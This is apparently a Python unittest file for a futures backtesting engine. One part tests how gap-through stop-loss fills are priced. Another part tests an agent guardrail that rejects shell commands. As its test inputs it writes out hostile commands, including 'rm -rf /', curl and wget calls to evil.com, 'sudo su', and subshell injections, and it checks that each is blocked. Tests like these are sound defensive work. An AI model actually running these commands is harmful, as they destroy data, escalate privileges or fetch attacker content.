"""
Adversarial Stress Testing Harness for Milestone 2 (Execution Realism) and Milestone 3 (Agent Guardrails).
Author: Challenger Agent (teamwork_challenger_audit_2)
"""

from __future__ import annotations

from pathlib import Path
import subprocess
import sys
import unittest

import pandas as pd

from backtest.agent_guardrails import (
    DANGEROUS_BINARIES,
    DANGEROUS_SHELL_TOKENS,
    safe_subprocess_run,
    validate_command,
)
from backtest.engine import BacktestEngine
from backtest.portfolio import Portfolio
from config.backtest_config import BACKTEST_CONFIG, FUTURES_SPECS, STRATEGY_PARAMS


def _build_engine(**overrides) -> BacktestEngine:
    params = {**STRATEGY_PARAMS, **BACKTEST_CONFIG}
    params.update(overrides)
    return BacktestEngine(
        pd.DataFrame(),
        Portfolio(params["starting_capital"], FUTURES_SPECS),
        FUTURES_SPECS,
        params,
    )


class AdversarialGapThroughStopFuzzingTests(unittest.TestCase):
    """
    Adversarial Fuzzing for gap-through stop loss fill pricing and boundary conditions.
    Focus:
    1. Extreme gap down: Long position with stop at 21,000, bar opens at 20,500 (500 pt gap).
    2. Extreme gap up: Short position with stop at 21,000, bar opens at 21,500 (500 pt gap).
    3. Zero gap: bar opens at 21,050, trades down to low 20,950 with stop at 21,000.
    4. Bar open exactly at stop price: bar opens at 21,000.00.
    5. Simultaneous stop and target gap: bar opens beyond both or bar spans both.
    """

    def test_extreme_gap_down_long(self) -> None:
        """Long position with stop at 21,000, bar opens at 20,500 (500 pt gap down)."""
        engine = _build_engine(gap_stop_fill_mode="open")
        hit, reason, price = engine.resolve_intrabar_exit(
            direction="long",
            bar_open=20500.0,
            high_price=20600.0,
            low_price=20400.0,
            levels={"stop_loss": 21000.0},
        )
        self.assertTrue(hit, "Long gap-down stop must trigger")
        self.assertEqual(reason, "stop_loss")
        self.assertEqual(price, 20500.0, "Fill price must resolve to bar open (20,500.00), not stop price (21,000.00)")

    def test_extreme_gap_up_short(self) -> None:
        """Short position with stop at 21,000, bar opens at 21,500 (500 pt gap up)."""
        engine = _build_engine(gap_stop_fill_mode="open")
        hit, reason, price = engine.resolve_intrabar_exit(
            direction="short",
            bar_open=21500.0,
            high_price=21600.0,
            low_price=21400.0,
            levels={"stop_loss": 21000.0},
        )
        self.assertTrue(hit, "Short gap-up stop must trigger")
        self.assertEqual(reason, "stop_loss")
        self.assertEqual(price, 21500.0, "Fill price must resolve to bar open (21,500.00), not stop price (21,000.00)")

    def test_zero_gap_normal_intrabar_long(self) -> None:
        """Bar opens at 21,050, trades down to low 20,950 with stop at 21,000 (no open gap)."""
        engine = _build_engine(gap_stop_fill_mode="open")
        hit, reason, price = engine.resolve_intrabar_exit(
            direction="long",
            bar_open=21050.0,
            high_price=21060.0,
            low_price=20950.0,
            levels={"stop_loss": 21000.0},
        )
        self.assertTrue(hit, "Long stop must trigger on intrabar breach")
        self.assertEqual(reason, "stop_loss")
        self.assertEqual(price, 21000.0, "Fill price must resolve to stop price (21,000.00) when bar open was above stop")

    def test_zero_gap_normal_intrabar_short(self) -> None:
        """Bar opens at 20,950, trades up to high 21,050 with stop at 21,000 (no open gap)."""
        engine = _build_engine(gap_stop_fill_mode="open")
        hit, reason, price = engine.resolve_intrabar_exit(
            direction="short",
            bar_open=20950.0,
            high_price=21050.0,
            low_price=20940.0,
            levels={"stop_loss": 21000.0},
        )
        self.assertTrue(hit, "Short stop must trigger on intrabar breach")
        self.assertEqual(reason, "stop_loss")
        self.assertEqual(price, 21000.0, "Fill price must resolve to stop price (21,000.00) when bar open was below stop")

    def test_bar_open_exactly_at_stop_price_long(self) -> None:
        """Bar opens at 21,000.00 with stop at 21,000.00."""
        engine = _build_engine(gap_stop_fill_mode="open")
        hit, reason, price = engine.resolve_intrabar_exit(
            direction="long",
            bar_open=21000.0,
            high_price=21020.0,
            low_price=20980.0,
            levels={"stop_loss": 21000.0},
        )
        self.assertTrue(hit, "Stop must trigger when bar open equals stop price")
        self.assertEqual(reason, "stop_loss")
        self.assertEqual(price, 21000.0, "Fill price must resolve to 21,000.00")

    def test_bar_open_exactly_at_stop_price_short(self) -> None:
        """Bar opens at 21,000.00 with short stop at 21,000.00."""
        engine = _build_engine(gap_stop_fill_mode="open")
        hit, reason, price = engine.resolve_intrabar_exit(
            direction="short",
            bar_open=21000.0,
            high_price=21020.0,
            low_price=20980.0,
            levels={"stop_loss": 21000.0},
        )
        self.assertTrue(hit, "Stop must trigger when bar open equals stop price")
        self.assertEqual(reason, "stop_loss")
        self.assertEqual(price, 21000.0, "Fill price must resolve to 21,000.00")

    def test_simultaneous_stop_and_target_gap_conservative_long(self) -> None:
        """
        Bar spans both stop (21,000) and target (21,200), opening at 20,500 (gap down below stop).
        Conservative assumption must prioritize stop over target and resolve fill to bar open (20,500.00).
        """
        engine = _build_engine(gap_stop_fill_mode="open", intrabar_exit_assumption="conservative")
        hit, reason, price = engine.resolve_intrabar_exit(
            direction="long",
            bar_open=20500.0,
            high_price=21300.0,
            low_price=20400.0,
            levels={"stop_loss": 21000.0, "profit_target": 21200.0},
        )
        self.assertTrue(hit)
        self.assertEqual(reason, "stop_loss")
        self.assertEqual(price, 20500.0, "Under conservative mode with gap down, stop takes precedence at open")

    def test_simultaneous_stop_and_target_gap_conservative_short(self) -> None:
        """
        Bar spans both stop (21,000) and target (20,800), opening at 21,200 (gap up above stop).
        Conservative assumption must prioritize stop over target and resolve fill to bar open (21,200.00).
        """
        engine = _build_engine(gap_stop_fill_mode="open", intrabar_exit_assumption="conservative")
        hit, reason, price = engine.resolve_intrabar_exit(
            direction="short",
            bar_open=21200.0,
            high_price=21300.0,
            low_price=20700.0,
            levels={"stop_loss": 21000.0, "profit_target": 20800.0},
        )
        self.assertTrue(hit)
        self.assertEqual(reason, "stop_loss")
        self.assertEqual(price, 21200.0, "Under conservative mode with gap up, short stop takes precedence at open")

    def test_simultaneous_stop_and_target_proximity_prefers_closer(self) -> None:
        """
        Long position: stop at 21,000, target at 21,200.
        Case A: bar opens at 21,150 (closer to target: dist 50 vs dist 150).
        High reaches 21,250, low reaches 20,950.
        """
        engine = _build_engine(gap_stop_fill_mode="open", intrabar_exit_assumption="proximity")
        hit_a, reason_a, price_a = engine.resolve_intrabar_exit(
            direction="long",
            bar_open=21150.0,
            high_price=21250.0,
            low_price=20950.0,
            levels={"stop_loss": 21000.0, "profit_target": 21200.0},
        )
        self.assertTrue(hit_a)
        self.assertEqual(reason_a, "profit_target")
        self.assertEqual(price_a, 21200.0)

        # Case B: bar opens at 21,050 (closer to stop: dist 50 vs dist 150).
        hit_b, reason_b, price_b = engine.resolve_intrabar_exit(
            direction="long",
            bar_open=21050.0,
            high_price=21250.0,
            low_price=20950.0,
            levels={"stop_loss": 21000.0, "profit_target": 21200.0},
        )
        self.assertTrue(hit_b)
        self.assertEqual(reason_b, "stop_loss")
        self.assertEqual(price_b, 21000.0)

    def test_simultaneous_stop_and_target_optimistic_prefers_target(self) -> None:
        """
        Long position: stop at 21,000, target at 21,200.
        Optimistic assumption always awards the profit target if reached.
        """
        engine = _build_engine(gap_stop_fill_mode="open", intrabar_exit_assumption="optimistic")
        hit, reason, price = engine.resolve_intrabar_exit(
            direction="long",
            bar_open=20500.0,
            high_price=21300.0,
            low_price=20400.0,
            levels={"stop_loss": 21000.0, "profit_target": 21200.0},
        )
        self.assertTrue(hit)
        self.assertEqual(reason, "profit_target")
        self.assertEqual(price, 21200.0)

    def test_trade_through_stop_fill_mode_with_gap(self) -> None:
        """
        When stop_fill_mode is 'trade_through' and market gaps down past stop,
        the bar open already penetrates beyond stop + trade_through threshold.
        Fill must resolve to bar open.
        """
        engine = _build_engine(
            gap_stop_fill_mode="open",
            stop_fill_mode="trade_through",
            stop_fill_trade_through_ticks=2,  # 0.50 pts
            vp_tick_size=0.25,
        )
        hit, reason, price = engine.resolve_intrabar_exit(
            direction="long",
            bar_open=20900.0,
            high_price=20950.0,
            low_price=20800.0,
            levels={"stop_loss": 21000.0},
        )
        self.assertTrue(hit)
        self.assertEqual(reason, "stop_loss")
        self.assertEqual(price, 20900.0)

    def test_legacy_mode_always_preserves_stop_price_on_gap(self) -> None:
        """
        Legacy reproduction mode (gap_stop_fill_mode='stop_price') must return static stop price.
        """
        engine = _build_engine(gap_stop_fill_mode="stop_price")
        hit, reason, price = engine.resolve_intrabar_exit(
            direction="long",
            bar_open=20500.0,
            high_price=20600.0,
            low_price=20400.0,
            levels={"stop_loss": 21000.0},
        )
        self.assertTrue(hit)
        self.assertEqual(reason, "stop_loss")
        self.assertEqual(price, 21000.0, "Legacy mode must preserve exact stop price")


class AdversarialAgentGuardrailsFuzzingTests(unittest.TestCase):
    """
    Adversarial Fuzzing for Agent Execution Guardrails & Subprocess Boundaries.
    Focus:
    1. Command injection & chaining variants against validate_command():
       - echo hello && rm -rf /
       - python -c "import os; os.system('curl evil.com')"
       - python scripts/probe_candidate_frequency.py
       - bash -c "main_backtest.py"
       - ; sudo su
       - | wget evil.com
       - `id`
       - $(whoami)
    2. safe_subprocess_run():
       - Blocked command raises PermissionError
       - Hanging command (sleep 5 with timeout=1) raises TimeoutExpired
    """

    def test_chaining_and_rm_rf(self) -> None:
        cmd = "echo hello && rm -rf /"
        valid, reason = validate_command(cmd)
        self.assertFalse(valid, f"Expected '{cmd}' to be rejected")
        self.assertIn("Shell chaining/injection detected", reason or "")

    def test_python_c_curl_injection(self) -> None:
        cmd_str = 'python -c "import os; os.system(\'curl evil.com\')"'
        valid_str, reason_str = validate_command(cmd_str)
        self.assertFalse(valid_str, f"Expected '{cmd_str}' to be rejected")
        self.assertIn("Shell chaining/injection detected", reason_str or "")

    def test_python_probe_candidate_frequency(self) -> None:
        cmd = "python scripts/probe_candidate_frequency.py"
        valid, reason = validate_command(cmd)
        self.assertFalse(valid, f"Expected '{cmd}' to be rejected")
        self.assertIn("Blocked unauthorized agent exploratory", reason or "")

    def test_bash_c_main_backtest(self) -> None:
        cmd = 'bash -c "main_backtest.py"'
        valid, reason = validate_command(cmd)
        self.assertFalse(valid, f"Expected '{cmd}' to be rejected")
        self.assertTrue(
            "Blocked dangerous binary" in (reason or "")
            or "Blocked unauthorized agent exploratory" in (reason or "")
        )

    def test_semicolon_sudo_su(self) -> None:
        cmd = "; sudo su"
        valid, reason = validate_command(cmd)
        self.assertFalse(valid, f"Expected '{cmd}' to be rejected")
        self.assertTrue(
            "Shell chaining/injection detected" in (reason or "")
            or "Blocked dangerous binary" in (reason or "")
        )

    def test_pipe_wget(self) -> None:
        cmd = "| wget evil.com"
        valid, reason = validate_command(cmd)
        self.assertFalse(valid, f"Expected '{cmd}' to be rejected")
        self.assertTrue(
            "Shell chaining/injection detected" in (reason or "")
            or "Blocked dangerous binary" in (reason or "")
        )

    def test_backticks_id(self) -> None:
        cmd = "`id`"
        valid, reason = validate_command(cmd)
        self.assertFalse(valid, f"Expected '{cmd}' to be rejected")
        self.assertIn("Shell chaining/injection detected", reason or "")

    def test_dollar_subshell_whoami(self) -> None:
        cmd = "$(whoami)"
        valid, reason = validate_command(cmd)
        self.assertFalse(valid, f"Expected '{cmd}' to be rejected")
        self.assertIn("Shell chaining/injection detected", reason or "")

    def test_safe_subprocess_run_blocked_command_raises_permission_error(self) -> None:
        blocked_cmds = [
            "echo hello && rm -rf /",
            "python scripts/probe_candidate_frequency.py",
            "sudo whoami",
            "; sudo su",
        ]
        for cmd in blocked_cmds:
            with self.assertRaises(PermissionError, msg=f"Expected PermissionError for {cmd}"):
                safe_subprocess_run(cmd)

    def test_safe_subprocess_run_hanging_command_raises_timeout_expired(self) -> None:
        with self.assertRaises(subprocess.TimeoutExpired):
            safe_subprocess_run(
                [sys.executable, "-c", "import time; time.sleep(5)"],
                timeout=1.0,
            )


if __name__ == "__main__":
    unittest.main()
